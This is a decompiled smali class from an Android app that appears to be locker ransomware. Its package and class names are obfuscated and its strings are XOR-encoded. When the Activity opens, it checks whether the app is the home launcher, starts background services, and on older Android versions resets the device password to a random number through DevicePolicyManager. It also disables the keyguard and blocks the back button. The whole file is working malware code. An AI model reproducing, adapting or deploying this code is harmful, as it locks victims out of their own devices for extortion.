.class public Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;
.super Landroid/app/Activity;


# static fields
.field private static final a:[Ljava/lang/String;

.field public static b:I


# direct methods
.method static constructor <clinit>()V
    .locals 12

    const/16 v0, 0x8

    new-array v3, v0, [Ljava/lang/String;

    const/4 v2, 0x0

    const-string v1, "\u001d\u001c\u0007xL\u0015\u0016McM\u0008\u0017\r~\r\u001f\u0013\u0017oD\u0013\u0000\u001a$k3?&"

    const/4 v0, -0x1

    move-object v4, v3

    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->toCharArray()[C

    move-result-object v1

    array-length v5, v1

    const/4 v6, 0x0

    const/4 v7, 0x1

    if-gt v5, v7, :cond_2

    :cond_0
    move-object v7, v1

    move v8, v6

    move v11, v5

    move-object v5, v1

    move v1, v11

    :goto_1
    aget-char v10, v5, v6

    rem-int/lit8 v9, v8, 0x5

    packed-switch v9, :pswitch_data_0

    const/16 v9, 0x23

    :goto_2
    xor-int/2addr v9, v10

    int-to-char v9, v9

    aput-char v9, v5, v6

    add-int/lit8 v6, v8, 0x1

    if-nez v1, :cond_1

    move-object v5, v7

    move v8, v6

    move v6, v1

    goto :goto_1

    :cond_1
    move v5, v1

    move-object v1, v7

    :cond_2
    if-gt v5, v6, :cond_0

    new-instance v5, Ljava/lang/String;

    invoke-direct {v5, v1}, Ljava/lang/String;-><init>([C)V

    invoke-virtual {v5}, Ljava/lang/String;->intern()Ljava/lang/String;

    move-result-object v1

    packed-switch v0, :pswitch_data_1

    aput-object v1, v3, v2

    const/4 v2, 0x1

    const-string v1, "\u001d\u001c\u0007xL\u0015\u0016McM\u0008\u0017\r~\r\u001d\u0011\u0017cL\u0012\\.Kj2"

    const/4 v0, 0x0

    move-object v3, v4

    goto :goto_0

    :pswitch_0
    aput-object v1, v3, v2

    const/4 v2, 0x2

    const-string v1, "YBWn"

    const/4 v0, 0x1

    move-object v3, v4

    goto :goto_0

    :pswitch_1
    aput-object v1, v3, v2

    const/4 v2, 0x3

    const-string v1, "\u0017\u0017\u001amV\u001d\u0000\u0007"

    const/4 v0, 0x2

    move-object v3, v4

    goto :goto_0

    :pswitch_2
    aput-object v1, v3, v2

    const/4 v2, 0x4

    const-string v1, "\u0018\u0017\u0015c@\u0019-\u0013eO\u0015\u0011\u001a"

    const/4 v0, 0x3

    move-object v3, v4

    goto :goto_0

    :pswitch_3
    aput-object v1, v3, v2

    const/4 v2, 0x5

    const-string v1, "#-\u0010aO\u001d\u0001\u0010o|\u0015\u001c\n~"

    const/4 v0, 0x4

    move-object v3, v4

    goto :goto_0

    :pswitch_4
    aput-object v1, v3, v2

    const/4 v2, 0x6

    const-string v1, "\u0017\u0017\u001amV\u001d\u0000\u0007"

    const/4 v0, 0x5

    move-object v3, v4

    goto :goto_0

    :pswitch_5
    aput-object v1, v3, v2

    const/4 v2, 0x7

    const-string v1, "#-\u0010aO\u001d\u0001\u0010o|\u0015\u001c\n~"

    const/4 v0, 0x6

    move-object v3, v4

    goto :goto_0

    :pswitch_6
    aput-object v1, v3, v2

    sput-object v4, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    return-void

    :pswitch_7
    const/16 v9, 0x7c

    goto :goto_2

    :pswitch_8
    const/16 v9, 0x72

    goto :goto_2

    :pswitch_9
    const/16 v9, 0x63

    goto :goto_2

    :pswitch_a
    const/16 v9, 0xa

    goto :goto_2

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_7
        :pswitch_8
        :pswitch_9
        :pswitch_a
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
        :pswitch_5
        :pswitch_6
    .end packed-switch
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public a()Ljava/lang/String;
    .locals 5

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v1, 0x2

    aget-object v0, v0, v1

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    new-instance v3, Ljava/util/Random;

    invoke-direct {v3}, Ljava/util/Random;-><init>()V

    const v4, 0x989680

    invoke-virtual {v3, v4}, Ljava/util/Random;->nextInt(I)I

    move-result v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    aput-object v3, v1, v2

    invoke-static {v0, v1}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public a(Landroid/content/Context;)Z
    .locals 5

    const/4 v0, 0x0

    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    new-instance v2, Landroid/content/Intent;

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v4, 0x1

    aget-object v3, v3, v4

    invoke-direct {v2, v3}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v3, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v4, 0x0

    aget-object v3, v3, v4

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v3, 0x10000

    invoke-virtual {v1, v2, v3}, Landroid/content/pm/PackageManager;->resolveActivity(Landroid/content/Intent;I)Landroid/content/pm/ResolveInfo;

    move-result-object v1

    iget-object v1, v1, Landroid/content/pm/ResolveInfo;->activityInfo:Landroid/content/pm/ActivityInfo;

    iget-object v1, v1, Landroid/content/pm/ActivityInfo;->packageName:Ljava/lang/String;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v0

    :goto_0
    return v0

    :catch_0
    move-exception v1

    goto :goto_0
.end method

.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    const/4 v3, 0x1

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/z;

    invoke-direct {v0}, Lzvy/zpfypq/bbuhtkwvaf/z;-><init>()V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;

    invoke-virtual {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/z;->a(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/high16 v1, 0x480000

    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/high16 v0, 0x7f030000

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->setContentView(I)V

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/r;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-direct {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;-><init>(Landroid/content/Context;)V

    :try_start_0
    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v2, 0x7

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v2, 0x5

    aget-object v1, v1, v2

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lzvy/zpfypq/bbuhtkwvaf/r;->a(Ljava/lang/String;Z)V
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0

    :cond_0
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lLIlllllIlllIlIlllIIIlIIIllIIlllIlILlllllIlIlllLlIlLlIII;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-class v2, Lzvy/zpfypq/bbuhtkwvaf/lllIIIIlIlllIlllIIIIlllIlllllllLIlLLIlIIlllIllIIllIILlll;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x18

    if-ge v0, v1, :cond_1

    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v1, 0x4

    aget-object v0, v0, v1

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Landroid/app/admin/DevicePolicyManager;->resetPassword(Ljava/lang/String;I)Z
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_1

    :cond_1
    sget-object v0, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v1, 0x6

    aget-object v0, v0, v1

    invoke-virtual {p0, v0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/KeyguardManager;

    sget-object v1, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->a:[Ljava/lang/String;

    const/4 v2, 0x3

    aget-object v1, v1, v2

    invoke-virtual {v0, v1}, Landroid/app/KeyguardManager;->newKeyguardLock(Ljava/lang/String;)Landroid/app/KeyguardManager$KeyguardLock;

    move-result-object v0

    invoke-virtual {v0}, Landroid/app/KeyguardManager$KeyguardLock;->disableKeyguard()V

    new-instance v0, Lzvy/zpfypq/bbuhtkwvaf/y;

    invoke-direct {v0}, Lzvy/zpfypq/bbuhtkwvaf/y;-><init>()V

    new-array v1, v3, [Landroid/content/Context;

    const/4 v2, 0x0

    invoke-virtual {p0}, Lzvy/zpfypq/bbuhtkwvaf/lllllIlllIlIIIllIIlIllIllllllIIlIIILllllLIllLllIIllLIlII;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    aput-object v3, v1, v2

    invoke-virtual {v0, v1}, Lzvy/zpfypq/bbuhtkwvaf/y;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    :cond_2
    return-void

    :catch_0
    move-exception v0

    throw v0

    :catch_1
    move-exception v0

    throw v0
.end method
